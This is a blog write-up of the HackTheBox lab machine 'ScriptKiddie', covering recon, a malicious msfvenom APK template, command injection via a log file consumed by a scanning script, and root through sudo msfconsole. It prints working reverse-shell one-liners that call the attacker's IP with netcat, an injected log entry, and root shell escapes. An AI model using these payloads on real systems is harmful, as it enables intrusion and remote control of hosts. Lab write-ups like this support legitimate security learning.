---
layout: post
title:  "HackTheBox: ScriptKiddle"
date:   2022-01-31 08:00:00 +1000
categories: red-team
tags: linux reverse-shell command-injection metasploit
excerpt_separator: <!--more-->
---

**ScriptKiddie** is a Linux-based machine authored by *0xdf*, with an average rating of 4.2 stars.

<!--more-->

<p align="center"><img src="/assets/images/buff/main.png" /></p>

### // Recon
```
nmap -A scriptkiddie.htb
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-31 08:43 AEST
Nmap scan report for scriptkiddie.htb (10.10.10.226)
Host is up (0.041s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 3c:65:6b:c2:df:b9:9d:62:74:27:a7:b8:a9:d3:25:2c (RSA)
|   256 b9:a1:78:5d:3c:1b:25:e0:3c:ef:67:8d:71:d3:a3:ec (ECDSA)
|_  256 8b:cf:41:82:c6:ac:ef:91:80:37:7c:c9:45:11:e8:43 (ED25519)
5000/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.8.5)
|_http-title: k1d'5 h4ck3r t00l5
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=1/31%OT=22%CT=1%CU=30910%PV=Y%DS=2%DC=T%G=Y%TM=61F714A
OS:9%P=x86_64-apple-darwin20.4.0)SEQ(SP=103%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS
OS:=A)OPS(O1=M54BST11NW7%O2=M54BST11NW7%O3=M54BNNT11NW7%O4=M54BST11NW7%O5=M
OS:54BST11NW7%O6=M54BST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE
OS:88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M54BNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=
OS:S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q
OS:=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A
OS:%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y
OS:%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T
OS:=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 3389/tcp)
HOP RTT      ADDRESS
1   43.60 ms 10.10.16.1
2   21.79 ms scriptkiddie.htb (10.10.10.226)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.66 seconds
```

Like a lot of Linux-based HTB machines, this one is running ssh (22) and a webserver, this time on port 5000. We also get some information about the webserver technology in use, *Werkzeug httpd 0.16.1 (Python 3.8.5)*. Visiting the website presents us with a series of hacking tools integrated into a webpage:

<p align="center"><img src="/assets/images/scriptkiddie/1.png" /></p>

### // Initial Foothold
The web tools are mostly functional - you can enter an IP such as `127.0.0.1` to scan via a basic nmap scan, generate an msfvenom payload with `os`, `lhost` and `template` inputs and even search for exploits via the searchsploit form. Since we already know the webserver running we can use this form to search for exploits on that:

<p align="center"><img src="/assets/images/scriptkiddie/2.png" /></p>

This version of Werkzeug webserver is vulnerable to a [remote code execution exploit](https://www.exploit-db.com/exploits/43905) via the debug console, a feature which is only intended for development use but sometimes left on in production. Running the python2 script is very easy, but unfortunately doesn't give us the result we're looking for:
```
python 43905.py 10.10.10.226 5000 10.10.17.230 4444
[-] Debug is not enabled
```

Looking closer at the script, we can see that it expects to be able to reach the console at `/console`, but there is only a 404 response from this url. At this point it seemed worth running a tool like [gobuster](https://github.com/OJ/gobuster) to see if perhaps the console had been moved to a different path (e.g `/admin`) or if there was any other interesting content to be found:
```
gobuster dir -u http://scriptkiddie.htb:5000/ -w ~/Sites/github/danielmiessler/SecLists/Discovery/Web-Content/raft-medium-words.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://scriptkiddie.htb:5000/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /Sites/github/danielmiessler/SecLists/Discovery/Web-Content/raft-medium-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/02/01 08:17:01 Starting gobuster in directory enumeration mode
===============================================================

===============================================================
2022/02/01 08:24:41 Finished
===============================================================
```

Nothing interesting was found, so it's possible that the console has been disabled on this site.

Turning to the embedded tools themselves, we can see that they each accept various inputs to run. Since the webpage is likely just forwarding these inputs to the tools behinds the scenes, it's possible that they might be vulnerable to [command injection](https://portswigger.net/web-security/os-command-injection), which could allow us to pass additional commands to the server beyond what it's expecting. For example, in the screengrab above the searchsploit scanner worked as expected when entering `werkzeug`, but if we enter `werkzeug; id` (that is, a search term followed by the command separator `;`, followed by the `id` command), we get something unexpected:

<p align="center"><img src="/assets/images/scriptkiddie/3.png" /></p>

This suggests some kind of filtering / protection has been implemented, to prevent the server from being abused via command injection. Implementing a filter that can fully handle all possible bypass techniques (and there are a [large](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection) [number](https://blog.0xffff.info/2021/07/28/os-command-injection-tutorial-part-1-basics-and-filter-evasion/) of techniques to choose from) can be difficult, so it's worth spending some time testing different command separators (`;`, `&&`, `||`,  `%0A` etc) as well as obfuscation encodings (base64, url, double-url, unicode etc.) to see if there's a way past. In this case though, the filtering seems to be well implemented, and none of the mentioned techniques change the outcome.

Zooming back out to look at the site as a whole again, it's always worth checking all identified software for known exploits. While we have checked the webserver itself, we also know there are other tools installed on the machine - *nmap 7.80* (seen in the nmap output), *msfvenom* (to generate the venom payloads) and *searchsploit*. If we search for exploits for these tools, we find something interesting for msfvenom:

<p align="center"><img src="/assets/images/scriptkiddie/4.png" /></p>

It seems that msfvenom itself, a tool widely used to generate exploit payloads, is vulnerable to its own exploit =) Using a fairly simply python script, we can define a payload (command) we wish to run, and then hide it in an `.apk` (Android Package) file. My preferred setup when establishing a reverse shell is to listen with the excellent [penelope shell handler](https://github.com/brightio/penelope) and execute a basic netcat payload on the target:
```
nc -e /bin/bash 10.10.17.230 4444
```

This didn't seem to work. We don't know for certain that netcat is installed on the server, but after some tinkering I realised that it's actually running the OpenBSD version of netcat, which doesn't support the `-e` flag. This handy [reverse shell cheatsheet](https://highon.coffee/blog/reverse-shell-cheat-sheet/) helps us out with the correct payload:
```
mkfifo /tmp/lol;nc ATTACKER-IP PORT 0</tmp/lol | /bin/sh -i 2>&1 | tee /tmp/lol
```

All we have to do now is fill out the venom form, specifying our malicious `.apk` file:

<p align="center"><img src="/assets/images/scriptkiddie/5.png" /></p>

and penelope catches the shell:
```
python penelope.py 4444
[+] Listening for reverse shells on 0.0.0.0 🚪4444
[+] Got reverse shell from 🐧 scriptkiddie.htb~10.10.10.226 💀 - Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12
kid@scriptkiddie:~/html$
```

From here, the user key is available in the usual location:
```
kid@scriptkiddie:~/html$ whoami
kid
kid@scriptkiddie:~/html$ cd ~
kid@scriptkiddie:~$ ls
html  logs  snap  user.txt
kid@scriptkiddie:~$ cat user.txt
b8******************************
```

### // Privilege Escalation

Now that we have a shell it's an easy task to upload [linpeas](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) via a python webserver & curl to check for privesc vectors. As usual there's a lot of output, but nothing that looks easily exploitable.

Browsing the user's home directory though, there are a couple of interesting things. There is a `logs` directory that is world-writeable, that contains a `hackers` file with a different group ownership:
```
kid@scriptkiddie:~/logs$ ls -la
total 8
drwxrwxrwx  2 kid kid 4096 Feb  3  2021 .
drwxr-xr-x 11 kid kid 4096 Feb  1 03:57 ..
-rw-rw-r--  1 kid pwn    0 Feb  1 01:40 hackers
```

The `hackers` file is empty, but if we go back into the `/html` folder and view the source of `app.py` we can see its purpose:
```
def searchsploit(text, srcip):
    if regex_alphanum.match(text):
        result = subprocess.check_output(['searchsploit', '--color', text])
        return render_template('index.html', searchsploit=result.decode('UTF-8', 'ignore'))
    else:
        with open('/home/kid/logs/hackers', 'a') as f:
            f.write(f'[{datetime.datetime.now()}] {srcip}\n')
        return render_template('index.html', sserror="stop hacking me - well hack you back")
```

The code is intended to log the IPs of users who fail the regex test (in other words, try malicious input). There's no obvious reason why the file is empty, even after we try to populate it with malicious payloads ourselves. As mentioned the file is owned by the group `pwn`, and `pwn` was identified as a user on the system earlier by linPEAS (or viewing `/etc/passwd`). Unexpectedly, we can browse the contents of this user's home directory:
```
kid@scriptkiddie:/home/pwn$ ls -l
total 8
drwxrw---- 2 pwn pwn 4096 Feb  1 01:30 recon
-rwxrwxr-- 1 pwn pwn  250 Jan 28  2021 scanlosers.sh
```

The `recon` folder is protected, but we can view `scanlosers.sh`:
```
#!/bin/bash

log=/home/kid/logs/hackers

cd /home/pwn/
cat $log | cut -d' ' -f3- | sort -u | while read ip; do
    sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &
done

if [[ $(wc -l < $log) -gt 0 ]]; then echo -n > $log; fi
```

This looks like a basic bash script that performs a few steps:
1. reads the log entries from `/home/kidd/logs/hackers`
2. parse out the IP address, run an nmap scan against it and store the output in the `./recon` directory
3. clear out the content of the log file (this explains why we can't see any content in it)

Similar to a webpage that makes assumptions about input without validation, this script is doing the same, and can be exploited because of it. A typical entry to the log file would appear as:
```
[2022-02-01 05:58:11.178217] 10.10.17.230
```

So the third section of the line, `10.10.17.230`, is what we can target for command injection. If we simply echo output into the file as the `kidd` user like this:
```
echo 'date time ;touch ~/testfile #' >> hackers
```

we're able to make files in the `pwn` user's home directory. This same technique can be used to create a reverse shell back to our attack machine, using the same machine as earlier (this time on port 5555):
```
echo 'date time ;mkfifo /tmp/lol2; nc 10.10.17.230 5555 0</tmp/lol2 | /bin/sh -i 2>&1 | tee /tmp/lol2 #' >> hackers
```

which we can catch with penelope:
```
python penelope.py 5555
[+] Listening for reverse shells on 0.0.0.0 🚪5555
[+] Got reverse shell from 🐧 scriptkiddie.htb~10.10.10.226 💀 - Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12
pwn@scriptkiddie:~$
```

We now have access as two different users on the machine. Running linPEAS as the `pwn` user (or even just performing basic enumeration manually e.g. `sudo -l` reveals more privileges for this user):
```
pwn@scriptkiddie:~$ sudo -l
Matching Defaults entries for pwn on scriptkiddie:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pwn may run the following commands on scriptkiddie:
    (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole
```

This user can run `msfconsole`, the central binary of metasploit, as root, with no password. With that level of access, there are various ways to access the root level key:
```
pwn@scriptkiddie:~$ sudo /opt/metasploit-framework-6.0.9/msfconsole

 _                                                    _
/ \    /\         __                         _   __  /_/ __
| |\  / | _____   \ \           ___   _____ | | /  \ _   \ \
| | \/| | | ___\ |- -|   /\    / __\ | -__/ | || | || | |- -|
|_|   | | | _|__  | |_  / -\ __\ \   | |    | | \__/| |  | |_
      |/  |____/  \___\/ /\ \\___/   \/     \__|    |_\  \___\


       =[ metasploit v6.0.9-dev                           ]
+ -- --=[ 2069 exploits - 1122 auxiliary - 352 post       ]
+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

Metasploit tip: You can upgrade a shell to a Meterpreter session on many platforms using sessions -u <session_id>

msf6 > cat ~/root.txt
[*] exec: cat ~/root.txt

0408f38826c1a4d427dbf69219ad6483
```

or obtain a root shell, through the inbuilt interactive ruby shell, `irb`:
```
msf6 > irb
[*] Starting IRB shell...
[*] You are in the "framework" object

irb: warn: can't alias jobs from irb_jobs.
>> system("/bin/bash")
root@scriptkiddie:/home/pwn#
```

or just directly using a shell like bash:
```
msf6 > /bin/bash
[*] exec: /bin/bash

root@scriptkiddie:/home/pwn#
```

<p align="center"><img src="/assets/images/scriptkiddie/6.png" /></p>

### // Lessons Learned
1. Some tools like netcat have different implementation, and the switches for these may differ
2. When testing command injection, it's better to test simple payloads first (e.g. curl-ing a url on your attack machine) to confirm the target is definitely vulnerable, before moving on to more complex payloads
3. It's important to enumerate the presence and access of *all* users on the machine, not just the one that was used to gain an initial foothold